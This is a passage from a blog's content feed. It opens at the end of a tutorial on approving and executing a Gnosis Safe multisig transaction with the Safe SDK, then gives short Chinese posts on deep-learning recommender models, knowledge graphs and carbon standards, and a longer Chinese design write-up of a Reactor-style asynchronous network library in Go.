<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> three_ethers = ethers.utils.parseUnits(<span class="string">&quot;3&quot;</span>, <span class="string">&#x27;ether&#x27;</span>).toHexString();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> transaction = &#123;</span><br><span class="line">  to: yacht_shop,</span><br><span class="line">  data: <span class="string">&#x27;0x&#x27;</span>,</span><br><span class="line">  value: three_ethers</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> safeTransaction = <span class="keyword">await</span> safeSdk_ceo.createTransaction(transaction);</span><br><span class="line"><span class="keyword">const</span> hash = <span class="keyword">await</span> safeSdk_ceo.getTransactionHash(safeTransaction);</span><br></pre></td></tr></table></figure>

<p>The transaction is sending 3ETH to the yacht shop. Since the transaction is transferring ETH, you can fill empty data, <code>0x</code>, in the data field of the transaction. However, if you create a smart contract transaction, such as minting NFTs or selling tokens, you will need to fill the data field.</p>
<p>After doing that, create the safe transaction using the <code>createTransaction</code> method. Then, get the hash with the <code>getTransactionHash</code> method.</p>
<p>Finally, your job as CEO is to approve the transaction:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> txResponse = <span class="keyword">await</span> safeSdk_ceo.approveTransactionHash(hash);</span><br><span class="line"><span class="keyword">await</span> txResponse.transactionResponse?.wait();</span><br></pre></td></tr></table></figure>

<p>But your job is not done yet. You call your co-founder, the CTO of your startup, and persuade her to approve the transaction of buying a yacht. “Wouldn’t it be nice if you could code in the vast ocean?”</p>
<p>Your CTO agrees to approve the transaction:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> safeSdk_cto = <span class="keyword">await</span> Safe.create(&#123; <span class="attr">ethAdapter</span>: ethAdapter_cto,</span><br><span class="line">                                        safeAddress: treasury,</span><br><span class="line">                                        contractNetworks: contractNetworks &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> safeTransactionCTO = <span class="keyword">await</span> safeSdk_cto.createTransaction(transaction);</span><br><span class="line"><span class="keyword">const</span> hashCTO = <span class="keyword">await</span> safeSdk_ceo.getTransactionHash(safeTransaction);</span><br><span class="line"><span class="keyword">const</span> txResponse_cto = <span class="keyword">await</span> safeSdk_cto.approveTransactionHash(hashCTO);</span><br><span class="line"><span class="keyword">await</span> txResponse_cto.transactionResponse?.wait();</span><br></pre></td></tr></table></figure>

<p>The CTO needs a different Safe object. But you don’t need to create it with the safe factory; you can create it with the <code>create</code> method of the Safe object. Because your safe smart contract is live already on the blockchain, you just passed the treasury address when you created the Safe object.</p>
<p>Next, you pass the transaction to your CTO either by chatting or via email. What the transaction means in this context is the <code>transaction</code> object in the code. Remember, you’ve already created this object:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> transaction = &#123;</span><br><span class="line">  to: yacht_shop,</span><br><span class="line">  data: <span class="string">&#x27;0x&#x27;</span>,</span><br><span class="line">  value: three_ethers</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Your CTO created a safe transaction from this one and got its hash. Then, she approves the transaction using the <code>approveTransactionHash</code> method, which accepts the hash argument.</p>
<p>Your job is still not done yet; you need another signature. But this time, you don’t need to convince your advisor because he gives you full support to buy a yacht. He approves the transaction:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> safeSdk_advisor = <span class="keyword">await</span> Safe.create(&#123; <span class="attr">ethAdapter</span>: ethAdapter_advisor,</span><br><span class="line">                                            safeAddress: treasury,</span><br><span class="line">                                            contractNetworks: contractNetworks &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> safeTransactionAdvisor = <span class="keyword">await</span> safeSdk_advisor.createTransaction(transaction);</span><br><span class="line"><span class="keyword">const</span> txResponse_advisor = <span class="keyword">await</span> safeSdk_advisor.executeTransaction(safeTransactionAdvisor);</span><br><span class="line"><span class="keyword">await</span> txResponse_advisor.transactionResponse?.wait();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Buying a yacht.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>The code is the same as the CTO’s approval transaction, but instead of the <code>approveTransactionHash</code> method, the advisor used the <code>executeTransaction</code> method. This method approves the transaction as well behind the scenes. But most importantly, this method executes the safe transaction, which is buying a yacht!</p>
<p>Finally, let’s check your treasury balance:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> afterBalance = <span class="keyword">await</span> safeSdk_ceo.getBalance();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`The final balance of the treasury: <span class="subst">$&#123;ethers.utils.formatUnits(afterBalance, <span class="string">&quot;ether&quot;</span>)&#125;</span> ETH`</span>);</span><br></pre></td></tr></table></figure>

<p>The script is finished. You can execute the script like so:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> node index.js</span></span><br><span class="line">Fundraising.</span><br><span class="line">Initial balance of the treasury: 10.0 ETH</span><br><span class="line">Buying a yacht.</span><br><span class="line">The final balance of the treasury: 7.0 ETH</span><br></pre></td></tr></table></figure>

<p>Now, you can work in a yacht with your team building a DAO to disrupt banks!</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this article, you learned how to create a Gnosis Safe that can be configured to require multiple signatures to approve transactions. You launched the Gnosis Safe smart contracts in the Hardhat development network, then, using the Gnosis safe SDK, created a safe to hold the treasury. Using multiple addresses, you created and approved the transaction of sending ETH.</p>
<p>This article only explains the SDK of interacting with the Gnosis Safe smart contracts. If you want to learn the ins and outs of the smart contract themselves, you can check <a href="https://github.com/gnosis/safe-contracts/">their GitHub repository</a>! The SDK also has other methods like signing a transaction off-chain. Check <a href="https://github.com/gnosis/safe-core-sdk/tree/main/packages/safe-core-sdk">their GitHub repository</a> to learn more. The code for this article is available on <a href="https://github.com/arjunaskykok/gnosis-safe-web3-startup">this GitHub repository</a>.</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习推荐模型</title>
    <url>/2023/09/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%8E%A8%E8%8D%90%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p><img src="/2023/09/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%8E%A8%E8%8D%90%E6%A8%A1%E5%9E%8B/1.jpg"></p>
<ol>
<li><p>改变神经网络的复杂程度: 从最简单的单层神经网络模型 AutoRec ( 自编码器推荐)，到经典的深度神经网络结构 Deep Crossing(深度特征交叉)，其主 要的进化方式在于 增加了深度神经网络的层数和结构复杂度。</p>
</li>
<li><p>改变特征交叉方式: 这类模型的主要改变在于丰富了深度学习网络中特征交叉的方式。例如，改变了用户向量和物品向量互操作方式的 NeUralCF( Neural Collaborative Filtering,神经网络协同过滤)，定义了多种特征向量交叉操作的 PNN ( Product-based Neural Network, 基于积操作的神经网络 )模型。</p>
</li>
<li><p>组合模型: 这类模型主要是指 Wide&amp;Deep 模型及其后续变种 Deep&amp;Cross,DeepFM等，其思路是通过组合两种不同特点、优势互补的深度学 习网络，提升模型的综合能力。</p>
</li>
<li><p>FM 模型的深度学习演化版本: 传统推荐模型 FM 在深度学习时代有了 诸多后续版本，其中包括 NFM ( Neural Factorization Machine, 神经网络因子分解机 )、FNN ( Factorization-machine supported Neural Network, 基于因子分解机支持的神经网络)、AFM(Attention neural Factorization Machine, 注意力因子分解机)等，它们对 FM 的改进方向各不相同。例如，NFM 主要使用神经网络提升 FM 二阶部分的特征交叉能力，AFM 是引入了注意力机制的 FM 模型，FNN 利用 FM 的结果进行网络初始化。</p>
</li>
<li><p>注意力机制与推荐模型的结合: 这类模型主要是将“注意力机制”应用于深度学习推荐模型中，主要包括结合了 FM 与注意力机制的 AFM 和引入了注 意力机制的 CTR 预估模型 DIN ( Deep Interest Network, 深度兴趣网络)。</p>
</li>
<li><p>序列模型与推荐模型的结合: 这类模型的特点是使用序列模型模拟用户行为或用户兴趣的演化趋势，代表模型是 DIEN( Deep Interest Evolution Network, 深度兴趣进化网络 )。</p>
</li>
<li><p>强化学习与推荐模型的结合: 这类模型将强化学习应用于推荐领域，强调模型的在线学习和实时更新，其代表模型是 DRN( Deep Reinforcement Learning Network, 深度强化学习网络 )。</p>
</li>
</ol>
<p>— 摘录于《深度学习推荐模型》</p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>知识图谱简介</title>
    <url>/2019/09/23/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<ul>
<li>知识图谱是一种用图模型来描述知识和建模世界万物之间的关联关系的技术方法。</li>
</ul>
<ul>
<li>知识图谱在辅助搜索、辅助智能问答、自然语言理解、大数据分析、推荐计算、物联网设备互联、可解释性人工智能等多个方面展现出应用价值。</li>
</ul>
<ul>
<li><p>目前国内外典型的知识图谱项目</p>
<h4 id="1-Schema-org"><a href="#1-Schema-org" class="headerlink" title="1) Schema.org"></a>1) Schema.org</h4><p>采用互联网众包的方式生成和手机高质量的知识图谱数据。Schema 提供了一个词语本体，用于描述这些语义标签。目前已经包括600多个类和 900。。 多个关系。超过 31%的网页和 1200 万家网站已经使用了 Schema 发布语义化的链接数据。其他还包括 Siri、Cortana 等。<a href="http://cnschema.org/">中文 Schema 网址。</a></p>
<h4 id="2-Wikidata"><a href="#2-Wikidata" class="headerlink" title="2) Wikidata"></a>2) Wikidata</h4><p>Wikidata 2012 年启动，目标是构建一个免费开放、多语言、任何人或者机器都可以编辑修改的大规模链接知识库。支持以三元组为基础的只是条目自由编辑，例如“&lt;地球，地表面积是，五亿平方公里&gt;”的三元组陈述。截至 2018 年，已经包含超过 5000 万条知识条目。</p>
<h4 id="3-ConceptNet5"><a href="#3-ConceptNet5" class="headerlink" title="3) ConceptNet5"></a>3) ConceptNet5</h4><p>ConceptNet5版本已经包含有2800万关系描述。与Cyc相比，ConceptNet采用了非形式化、更加接近自然语言的描述，而不是像Cyc那样采用形式化的谓词逻辑。与链接数据和谷歌知识图谱相比，ConceptNet比较侧重于词与词之间的关系。从这个角度看，ConceptNet更加接近于WordNet，但是又比WordNet包含的关系类型多。此外，<a href="http://conceptnet5.media.mit.edu/">ConceptNet完全免费开放，并支持多种语言</a>，另附<a href="https://github.com/commonsense/conceptnet5">github 开源地址-here</a>。</p>
</li>
</ul>
<ul>
<li><p>技术方向</p>
<p>如下图：</p>
</li>
</ul>
<p><img src="/2019/09/23/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E7%AE%80%E4%BB%8B/kg.png"></p>
]]></content>
      <tags>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>碳减排标准</title>
    <url>/2024/01/19/%E7%A2%B3%E5%87%8F%E6%8E%92%E6%A0%87%E5%87%86/</url>
    <content><![CDATA[<p><strong>CDP（前称为碳信息披露项目）</strong>:</p>
<ul>
<li>网站：<a href="https://www.cdp.net/">cdp.net</a></li>
<li>CDP是一个国际非营利组织，提供一个系统化的平台，让公司、城市、州和地区能够测量、披露、管理和分享关键的环境信息。</li>
</ul>
<p><strong>Verra</strong></p>
<ul>
<li>网站：<a href="https://verra.org/">https://verra.org/</a></li>
<li>Verra sets the world’s leading standards for climate action and sustainable development.<br>  →  We build standards for activities as diverse as reducing deforestation, to improving agricultural practices, to addressing plastic waste, and to achieving gender equality.<br>  →  We manage programs to certify that these activities achieve measurable high-integrity outcomes.<br>  →  And we work with governments, businesses, and civil society to advance the use of these standards, including through the development of markets.</li>
</ul>
]]></content>
      <tags>
        <tag>ESG</tag>
      </tags>
  </entry>
  <entry>
    <title>用Go实现一个异步网络库</title>
    <url>/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/</url>
    <content><![CDATA[<p>在需要高性能、节省资源的场景下，比如海量的连接、很高的并发，我们发现Go开始变得吃力，不但内存开销大，而且还会有频繁的goroutine调度。GC时间也变得越来越长，甚至还会把系统搞挂。这时，我们就可以考虑用Go构建经典的Reactor网络模型，来应对这种场景。</p>
<h3 id="一、常见的服务端网络编程模型"><a href="#一、常见的服务端网络编程模型" class="headerlink" title="一、常见的服务端网络编程模型"></a>一、常见的服务端网络编程模型</h3><p>在具体讲Reactor网络库的实现前，我们先快速回顾下常见的服务端网络编程模型。</p>
<p>服务端网络编程主要解决两个问题，一个是<strong>服务端如何管理连接，特别是海量连接、高并发连接（经典的c10k/c100k问题）</strong>，二是<strong>服务端如何处理请求（高并发时正常响应）</strong>。</p>
<p>针对这两个问题，有三种解决方案，分别对应三种模型：</p>
<ul>
<li><p>传统IO阻塞模型。</p>
</li>
<li><p>Reactor模型。</p>
</li>
<li><p>Proactor模型。</p>
</li>
</ul>
<p>下面两图分别是传统IO阻塞模型和Reactor模型，传统IO阻塞模型的特点是每条连接都是由单独的线/进程管理，业务逻辑（crud）跟数据处理（网络连接上的read和write）都在该线/进程完成。<strong>缺点很明显，并发大时，需要创建大量的线/进程，系统资源开销大；连接建立后，如果当前线/进程暂时还没数据可读，会阻塞在Read调用上，浪费系统资源</strong>。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/1.png"></p>
<p>Reactor模型就是传统IO阻塞模型的改进，Reactor会起单独的线/进程去监听和分发事件，分发给其他EventHandlers处理数据读写和业务逻辑。这样，与传统IO阻塞模型不同的是，Reactor的连接都先到一个EventDispatcher上，一个核心的事件分发器，同时<strong>Reactor会使用IO多路复用在事件分发器上非阻塞地处理多个连接</strong>。</p>
<p>这个EventDispatcher跟后面的EventHandlers可以都在一个线/进程，也可以分开，下文会有区分。整体来看，Reactor就是一种事件分发机制，所以Reactor也被称为事件驱动模型。<strong>简而言之，Reactor=IO多路复用（I/O multiplexing）+非阻塞IO（non-blocking I/O）</strong>。</p>
<h4 id="（一）Reactor模型的三种实现"><a href="#（一）Reactor模型的三种实现" class="headerlink" title="（一）Reactor模型的三种实现"></a>（一）Reactor模型的三种实现</h4><p>根据Reactor的数量和业务线程的工作安排有3种典型实现：</p>
<ul>
<li><p>单Reactor多线程</p>
</li>
<li><p>单Reactor多线程带线程池</p>
</li>
<li><p>主从Reactor多线程（带线程池）</p>
</li>
</ul>
<p>先看两个单Reactor：</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/2.png"></p>
<p><strong>一个Reactor接管所有的事件安排</strong>，如果是建立连接事件，就交给Acceptor处理，接着创建对应的Handler处理该连接后续的读写事件。如果不是建立连接事件，就调用连接对应的Event Handler来响应。单Reator1和2的区别是2带了个线程池，一定程度上解放Event Handler线程，让Handler专注数据读写处理，特别是在遇到一些笨重、高耗时的业务逻辑时。</p>
<p>再来看多Reactor，这个是本文的主角，第三节内容就是怎么实现它。多Reactor就是主从多Reactor，它的特点是<strong>多个Reactor在多个单独的线/进程中运行，MainReactor负责处理建立连接事件，交给它的Acceptor处理，处理完了，它再分配连接给SubReactor；SubReactor则处理这个连接后续的读写事件，SubReactor自己调用EventHandlers做事情</strong>。</p>
<p>这种实现看起来职责就很明确，可以方便通过增加SubReactor数量来充分利用CPU资源，也是当前主流的服务端网络编程模型。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/2.1.jpeg"></p>
<h4 id="（二）Proactor模型自带主角光环"><a href="#（二）Proactor模型自带主角光环" class="headerlink" title="（二）Proactor模型自带主角光环"></a>（二）Proactor模型自带主角光环</h4><p>尽管本文的主角是主从多Reactor，但如果Proactor要当主角，就没Reactor什么事。</p>
<p>Proactor模型跟Reactor模型的<strong>本质区别是异步I/O和同步I/O的区别，即底层I/O实现</strong>。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/3.png"></p>
<p>从上面两张图可以看出，Reactor模型依赖的同步I/O需要不断检查事件发生，然后拷贝数据处理，而Proactor模型使用的异步I/O只需等待系统通知，直接处理内核拷贝过来的数据，孰优孰劣，一言便知。</p>
<p>基于异步I/O的Proactor模型实现如下图：</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/4.png"></p>
<p>那为什么主角光环如此明显的Proactor不是当前主流的服务端网络编程模型呢？</p>
<p>原因是在Linux下的AIO API–io_uring还没有像同步I/O那样能够覆盖和支持很多场景，即还没成熟到被广泛使用。</p>
<h3 id="二、Go原生网络模型简介"><a href="#二、Go原生网络模型简介" class="headerlink" title="二、Go原生网络模型简介"></a>二、Go原生网络模型简介</h3><p>关于Go原生网络模型的实现，网上已经有很多文章，这里就不过多展开，读者可以结合下图追踪整个代码流程：</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/5.png"></p>
<p>总结来说，<strong>Go所有的网络操作围绕网络描述符netFD展开，netFD与底层pollDesc结构绑定，当在一个netFD上读写遇到EAGAIN错误时，就将当前goroutine存储到绑定的pollDesc中，同时将goroutine给park住，直到这个netFD上的数据准备好，再唤醒goroutine完成数据读写</strong>。</p>
<p>再总结来说，<strong>Go原生网络模型就是个单Reactor多协程模型</strong>。</p>
<h4 id="三、如何从0到1实现异步网络库"><a href="#三、如何从0到1实现异步网络库" class="headerlink" title="三、如何从0到1实现异步网络库"></a>三、如何从0到1实现异步网络库</h4><p>我们现在回顾了常见的服务端网络编程模型，也知道Go处理连接的方式是一个连接给分配一个协程处理，即goroutine-per-conn模式。</p>
<p>那本节就到了我们的重点，怎么去实现一个异步网络库（因为Reactor模型的实现，一般是主线程accept一个连接后，分给其他的线/进程异步处理后续的业务逻辑和数据读写，所以一般Reactor模型的网络库被称为异步网络库，并不是使用异步I/O的API）。</p>
<p>在具体实现之前，笔者先介绍下需求背景。</p>
<h4 id="（一）需求背景"><a href="#（一）需求背景" class="headerlink" title="（一）需求背景"></a>（一）需求背景</h4><p>Go的协程非常轻量，大部分场景下，基于Go原生网络库构建的应用都不会有什么性能瓶颈，资源占用也很可观。</p>
<p>我们现在使用的网关是基于C++自研的一款网关，我们想统一技术栈，换成Go的，我们现在峰值会在百万连接上下，大概用了几十台机器，单机能稳定支撑几十万的连接。如果换成Go的话，我们一直疑惑，基于Go实现的网关单机能撑多少，内存跟CPU怎么样？能不能省点机器？</p>
<p>于是，笔者开始针对这种有大量连接的场景对Go做了一波压测，得出的结论也显而易见：<strong>随着连接数上升，Go的协程数也随之线性上升，内存开销增大，GC时间占比增加。当连接数到达一定数值时，Go的强制GC还会把进程搞挂，服务不可用</strong>。（下文会有网络库的对比压测数据）</p>
<p>接着，笔者翻阅内外网有同样场景的解决方案，基本都是往经典Reactor模型实现上做文章。比如最早的A Million WebSockets and Go，作者Sergey Kamardin使用epoll的方式代替goroutine-per-conn模式，百万连接场景下用少量的goroutine去代替一百万的goroutine。</p>
<p>A Million WebSockets and Go：</p>
<p><a href="https://www.freecodecamp.org/news/million-websockets-and-go-cc58418460bb/">https://www.freecodecamp.org/news/million-websockets-and-go-cc58418460bb/</a></p>
<p>Sergey Kamardin的方案总结：</p>
<p>Let’s structure the optimizations I told you about.</p>
<ul>
<li>A read goroutine with a buffer inside is expensive. Solution: netpoll (epoll, kqueue); reuse the buffers.</li>
<li>A write goroutine with a buffer inside is expensive. Solution: start the goroutine when necessary; reuse the buffers.</li>
<li>With a storm of connections, netpoll won’t work. Solution: reuse the goroutines with the limit on their number.</li>
<li>net/http is not the fastest way to handle Upgrade to WebSocket. Solution: use the zero-copy upgrade on bare TCP connection.</li>
</ul>
<p>又比如字节基于Reactor网络库netpoll开发了RPC框架Kitex来应对高并发场景。</p>
<p>笔者简单用Go实现了一个网关，使用这些Reactor网络库再进行了一波压测，结果符合预期：连接数上去后的Go网关确实比之前的稳定，内存占用也很可观。但最终都没有选用这些开源Reactor库，原因是<strong>这些开源库都不是开箱即用，都没有实现HTTP/1.x、TLS等常见协议；API设计不够灵活且专注的场景并不适合网关，比如netpoll目前主要专注于RPC场景</strong>（字节上周才正式对外开源HTTP框架Hertz）；<strong>整体改造成本高，难以适配运用到Go网关中</strong>。</p>
<p>Netpoll的场景说明：</p>
<p>另一方面，开源社区目前缺少专注于RPC方案的Go网络库。类似的项目如：evio，gnet等，均面向Redis，HAProxy这样的场景。</p>
<h4 id="（二）总体分层设计"><a href="#（二）总体分层设计" class="headerlink" title="（二）总体分层设计"></a>（二）总体分层设计</h4><p>终于到了实现部分，我们先看一个Reactor库的总体分层设计，总体分为三层：应用层、连接层和基础层。</p>
<p>应用层就是常见的EchoServer、HTTPServer、TLSServer和GRPCServer等等，主要负责协议解析、执行业务逻辑，对应Reactor模型里边的EventHandler。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/6.png"></p>
<p>在Reactor模型中，应用层会实现事件处理的接口，等待连接层调用。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handler Core 注册接口type Handler interface &#123;  OnOpen(c *Conn)</span></span><br><span class="line"><span class="comment">// happen on accept conn  OnClose(c *Conn, err error)</span></span><br><span class="line"><span class="comment">// happen ob delete conn  OnData(c *Conn, data []byte)</span></span><br><span class="line"><span class="comment">// happen on epoll wait  OnStop()&#125;</span></span><br></pre></td></tr></table></figure>

<p>比如当连接建立后，可以调用OnOpen函数做些初始化逻辑，当连接上有新数据到来，可以调用OnData函数完成具体的协议解析和业务逻辑。</p>
<h4 id="（三）连接层设计"><a href="#（三）连接层设计" class="headerlink" title="（三）连接层设计"></a>（三）连接层设计</h4><p>连接层就是整个Reactor模型的核心，根据上文的主从Reactor多线程模型，连接层主要有两种Reactor，一主（Main Reactor）多从（Sub Reactor），也可以多主多从。</p>
<p>Main Reactor主要负责监听和接收连接，接着分配连接，它里边有个for循环，不断去accept新连接，这里的方法可以叫做acceptorLoop；Sub Reactor拿到Main Reactor分配的连接，它也是个for循环，一直等待着读写事件到来，然后干活，即回调应用层执行具体业务逻辑，它的方法可以叫做readWriteLoop。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/7.png"></p>
<p>根据连接层的工作安排，可以发现我们需要以下三个数据结构：</p>
<ul>
<li><p>EventLoop：事件循环，即Reactor，用isMain区分主从，如果是Sub Reactor，每个SubReactor上挂着很多Conn。</p>
</li>
<li><p>Poller：Sub Reactor的里的readWriteLoop需要不断处理读写事件，这些事件在不同系统下由不同的I/O API监听和通知，在Linux系统下就是经典的Epoll三组函数，在Unix系统下（比如Mac）就是Kqueue。</p>
</li>
<li><p>Conn：Main Reactor的listener accept之后建立的连接，与一个文件描述符fd绑定。</p>
</li>
</ul>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/8.png"></p>
<h4 id="值得注意的fd竞态"><a href="#值得注意的fd竞态" class="headerlink" title="值得注意的fd竞态"></a>值得注意的fd竞态</h4><p>每个连接都会与一个fd绑定，当某个连接关闭后，它会释放掉fd，供新连接绑定，这也叫<strong>fd的复用</strong>。</p>
<p>通常我们的应用层会在一个协程池中执行它的业务逻辑，在连接层有个Sub Reactor在处理这个连接上的读写事件。</p>
<p>如果在应用层那边关闭了连接，而在Sub Reactor那边刚好在准备读这个连接上的数据，即操作这个fd。</p>
<p>当Sub Reactor还没来得及读，但被应用层关闭释放掉的fd，已经给到了一个新连接，这时Sub Reactor继续读这个fd上的数据，就会把新连接的数据读走。</p>
<p>因此，我们需要<strong>针对fd的操作前后加个锁，即在关闭连接跟在连接上读写前先上锁，关闭后才释放掉锁，并且在连接上读写前判断连接是否关闭</strong>，这样才会避免脏数据。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/9.png"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/VY8SELNGe95VxoqjGm1IfuicBMt3YLNVkg8j3Kte9fFPQgrTfkibf0xlCLkARz5cTdA5GDDzrRicXcruJrlsEuic6A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="Image"></p>
<h4 id="不可忽略的负载均衡"><a href="#不可忽略的负载均衡" class="headerlink" title="不可忽略的负载均衡"></a>不可忽略的负载均衡</h4><p>除了注意fd复用带来的竞态，还有一个不可忽略的负载均衡，在Main Reactor分配连接到Sub Reactor这个环节。</p>
<p>未来避免某个Sub Reactor过载，我们可以参考Nginx的负载均衡策略，大概有以下三种方式：</p>
<ul>
<li><p>轮询调度（Round-Robin Scheduling）：轮询Sub Reactors，逐个分配。</p>
</li>
<li><p>Fd哈希：c.fd%len(s.workLoops)，以fd值哈希整个Sub Reactors数量。</p>
</li>
<li><p>最小连接数（Least Connections）：优先分配给连接数最小的sub reactor。</p>
</li>
</ul>
<h3 id="（四）基础层设"><a href="#（四）基础层设" class="headerlink" title="（四）基础层设"></a>（四）基础层设</h3><p>Reactor的核心的活都在连接层干完了，<strong>基础层的作用是提供底层系统调用支持及做好内存管理</strong>。</p>
<p>系统调用就是常见的listen/accept/read/write/epoll_create/epoll_ctl/epoll_wait等，这里不展开。但内存管理的方式会极大地影响网络库的性能。</p>
<p>笔者曾经在处理连接上读事件的时候，先是用动态内存池的方式提供临时Buffer承接，对比使用固定Buffer去承接，前者需要一借一还，在某个简单Echo场景下压测，后者较前者提升了12wQPS，恐怖如斯。</p>
<p>以下是常见的内存管理方案，针对连接上读写处理时的内存使用优劣对比：</p>
<ul>
<li><p><strong>固定数组</strong></p>
</li>
<li><p>每次读都申请固定大小的buffer。</p>
</li>
<li><p>好处是实现简单，坏处是会积累临时对象。</p>
</li>
<li><p><strong>RingBuffer</strong></p>
</li>
</ul>
<p>读写分离，节省内存，但频繁扩容有性能损耗（扩容时需要搬迁老数据到新RingBuffer上）</p>
<ul>
<li><p><strong>LinkBuffer</strong></p>
</li>
<li><p>读写分离，节省内存</p>
</li>
<li><p>池化Block节点，方便扩容缩容且无性能损耗</p>
</li>
<li><p>可以实现NoCopy API，进一步提高性能。</p>
</li>
</ul>
<p>这里最理想的是第三种内存管理方案，字节的netpoll有实现。</p>
<p><img src="/2022/09/19/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%82%E6%AD%A5%E7%BD%91%E7%BB%9C%E5%BA%93/10.png"></p>
<p>这里引用某个项目的实现说明，<strong>NoCopy体现在连接层读到的数据，可以不用拷贝给应用层使用，而是让应用层引用LinkBuffer使用</strong>。</p>
<p>首先来讲零拷贝读取接口，我们将读取操作分成了「引用读」「释放」两个步骤，「引用读」会把 Linked Buffer 中一定长度的字节数组以指针的形式取出，用户使用完这些数据后，主动执行「释放」告知 Linked Buffer 刚刚「引用读」的数据空间不会再被使用，可以释放掉，被「释放」了的数据不能再被读取和修改。</p>
<p>零拷贝写入接口则是将用户传入的字节数组构造成一个个节点，每个节点里包含了字节数组的指针，再将这些节点添加到Linked Buffer中，自始至终都是对字节数组的指针进行操作，没有任何的拷贝行为。</p>
<h3 id="（五）性能测试"><a href="#（五）性能测试" class="headerlink" title="（五）性能测试"></a>（五）性能测试</h3><p>以上3小节就是一个Reactor网络库的框架和实现设计，流程并不复杂，笔者认为<strong>真正考验的是基于Reactor库去实现常见的HTTP/1.x协议、TLS协议甚至HTTP/2.0协议等等</strong>，笔者在实现HTTP/1.x的时候就试了很多开源解析器，很多性能都不尽人意；在尝试直接使用Go官方自带的TLS协议解析器，发现TLS四次握手并不是连续的包，第三次握手时，客户端发送的信息可以等一会…大部分问题都比较棘手，这估计也是很多开源库没有实现这些协议的原因吧~</p>
<ul>
<li><h4 id="压测结果"><a href="#压测结果" class="headerlink" title="压测结果"></a>压测结果</h4></li>
</ul>
<p>在开发完Reactor网络库及在这个库的基础上实现常见的应用层协议后，我们需要一波压测检验网络库的性能。</p>
<p>区别于网上大部分开源库只做简单的Echo压测，笔者这里构建了两种场景压测：</p>
<ul>
<li><p>Echo场景：EchoServer不需要做协议解析，也不需要做什么业务逻辑，目的是跟同类型的Reactor库做横向对比。</p>
</li>
<li><p>HTTP场景：HTTPServer需要解析HTTP/1.x协议，加上10w循环计数模拟业务逻辑，目的是跑到10w连接上跟Go net对比。</p>
</li>
</ul>
